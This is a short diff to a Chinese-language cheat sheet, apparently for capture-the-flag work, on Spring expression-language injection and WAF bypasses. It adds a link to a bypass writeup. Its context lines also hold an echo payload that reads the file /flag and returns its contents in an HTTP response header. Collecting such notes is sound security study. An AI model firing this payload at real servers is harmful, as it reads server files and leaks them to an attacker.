@@ -113,6 +113,8 @@ print(')}')
 
 其他bypass: https://xz.aliyun.com/t/9245
 
+https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/
+
 ## springboot回显
 ```
 Java.type("org.springframework.web.context.request.RequestContextHolder").currentRequestAttributes().getResponse().addHeader("test",new java.lang.String(Java.type("sun.misc.IOUtils").readFully(new java.io.FileInputStream("/flag"),1024,false)));
